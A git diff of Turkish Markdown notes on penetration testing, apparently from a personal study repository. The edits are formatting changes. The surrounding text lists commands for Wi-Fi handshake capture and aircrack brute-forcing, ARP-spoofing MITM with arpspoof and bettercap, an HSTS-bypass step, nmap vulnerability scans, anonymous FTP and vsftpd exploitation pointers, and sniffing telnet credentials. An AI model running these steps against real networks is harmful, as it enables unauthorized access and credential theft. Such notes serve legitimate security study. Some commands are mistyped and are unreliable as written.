@@ -162,7 +162,7 @@ Eğer Ağda Yeteri Kadar Cihaz Yoksa
 
 www.gpuhash.me  -> içine yakalanan handshake'i atarak online olarak şifre kırma işlemi uygulanabilir
 
-> ### Handshake Yakalama
+### Handshake Yakalama
 
 ``` airodump -ng --channel X --bssid XX:XX:XX:XX:XX:XX --write handshake-file wlan0mon```
 
@@ -174,7 +174,7 @@ write: Yakalanan handshake'in nereye kayıt edileceği
 
 **! Kolayca handshake yakalamak için ufak paketli deauth saldırı yapılabilir**
 
-> ### Wordlist Oluşturma
+### Wordlist Oluşturma
 
 ``` crunch 6 10 0123456789abcdefgh -o passwrd.txt``` 
 içinde "0123456789abcdefgh" geçen min 6 maks 10 haneli şifre kombinasyonlarının olduğu passwrd isimli wordlist oluşturur
@@ -183,7 +183,7 @@ içinde "0123456789abcdefgh" geçen min 6 maks 10 haneli şifre kombinasyonları
 
 ```cat wordlist.txt``` wordlistin içindeki şifreleri görmemizi sağlar
 
-> ### Parola Kırma
+### Parola Kırma
 
 ``` aircrack -ng handshake-file.cap -w passwrd.txt``` handshake dosyasını ve worlisti kullanarak brute froce saldırısı yapar
 
@@ -195,21 +195,21 @@ Brute Force mümkün olan bütün şifre kombinasyonlarını denemektir. Bu yön
 
 # 6-IP ve MAC Adreslerini Eşleme
 
-> ### Netdiscover
+### Netdiscover
 
 ```netdiscover -i eth0 -r XX:XX:XX/24 -c 10``` 
 
 * -r: eth0'daki inet'in ilk 6 hanesi
 * -c: deneme sayısı
 
-> ### nmap
+### nmap
 
 ``` nmap XX:XX.XX.0/24 ```  0 ve 24 yani tüm aralıktaki IPlere istek atar, IP ve MAC adreslerini eşleştirip ekstra bilgi verir. Atılan istekleri
 karşı taraf görebilir
 
 # 7-Man in the Middle Saldırısı
 
-> ### Arpspoof
+### Arpspoof
 
 İlk olarak **arpspoof**'u indirmemiz gerekiyor onun için; ```apt install dsniff```
 
@@ -226,13 +226,13 @@ XX:XX:XX:XX : Kurban IP
 ```
 ``` echo 1 > /proc/sys/net/ipv4/ip-forward``` IP forwardlamayı etkinleştirerek **hedef pc'nin** ağdan kopmamasını sağlıyoruz
 
-> ### Wireshark ile MITM Saldırısı İzleme
+### Wireshark ile MITM Saldırısı İzleme
 
 Wireshark kullanarak ağ izleme yapılabilir ve ARP isteği var mı incelenebilir eğer işlemlerin yanında **duplicate use of..** yazıyorsa MITM saldırısı vardır. **http** olan websitesi içine girilen bilgiler (e.g. Login bilgileri) Wireshark içinden incelenerek görülebilir. **https** olan websitelerinde bu bilgiler şifreli olarak taşındığı için açık şekilde okunamaz
 
   ![wireshark görsel](https://github.com/ahmetnuysal/Cyber-Security/blob/6880076de41a97a03edb4fe36e75dfce1e58ac9a/MITM/WhatsApp%20Image%202022-08-16%20at%2019.17.24.jpeg)
 
-> ### Bettercap 
+### Bettercap 
 
 * Terminal'e ```bettercap -iface eth0``` yazarak bettercap'i açıyoruz
 * bettercap çalıştırdıktan sonra ```help``` yazarsak içinde nelerin çalıştığını görebiliriz
@@ -255,11 +255,11 @@ Parametreleri değiştirmek için: ```set``` komutunu kullanıyoruz. ```(e.g. ar
 
 * ```net.sniff on``` Hedef PC'yi dinlemeye başlar
 
-> ### HTST
+### HTST
 
 ```htst``` ne olursa olsun o siteyi https olarak açmaya zorluyor
 
-> ### HTTPS to HTTP
+### HTTPS to HTTP
 
 ```hstshijack.cap``` dosyasında ```com``` uzantıları ```corn``` olarak değiştiriyoruz
 
@@ -270,8 +270,6 @@ Windows arama yerine ```cmd``` yazarak terminali açıyoruz ve ```arp -a``` yaza
 # 8- NMAP
 
 > ### NMAP ile Açık Arama
-
-# NMAP ile Açık İnceleme
 
 ```nmap -v -sS -A -T4 XX:XX:XX:XX:XX (Target IP)```  Taranan adresteki açıkları gösterir
 
@@ -292,7 +290,7 @@ Windows arama yerine ```cmd``` yazarak terminali açıyoruz ve ```arp -a``` yaza
 -p: Sadece bu parametreden sonra belirtilen portları tarar.
 -o: İşletim sistemi bilgilerini gösterir.
 ```
-> ### FTP
+### FTP
 
 ```ftp 192.168.123.123``` çalıştırıyoruz, kullanıcı adı ve şifre yerine "anonymous" yazıyoruz. ftp açığına bağlandıktan sonra ```put dosyaadı``` ile dosya ekleyebiliriz. Google'a nmap'te bulunan ```vsftpd A.B.C (vsftpd 2.3.4) exploit``` yazarak gerekli komutlara ulaşabiliriz
 
@@ -315,10 +313,10 @@ Windows arama yerine ```cmd``` yazarak terminali açıyoruz ve ```arp -a``` yaza
 2. ```ls, pwd``` gibi komutlarla sistemde gezinebiliriz
 3. ```background``` ile sistemden çıkış yaparız
 
-> ### TELNET
+### TELNET
 
 Telnet SSH'dan daha güvensizdir. ```telnet 192.168.123.123``` çalıştırarak giriş yapıp ```wireshark``` üzerinden şifre ve kullanıcı adını rahatça görebiliriz
 
-> ### SSH
+### SSH
 
 ```sshmsfadmin@192.168.123.123``` çalıştırarak giriş yapıp ```wireshark``` üzerinden şifre ve kullanıcı adını **şifrelenmiş** olarak görürüz
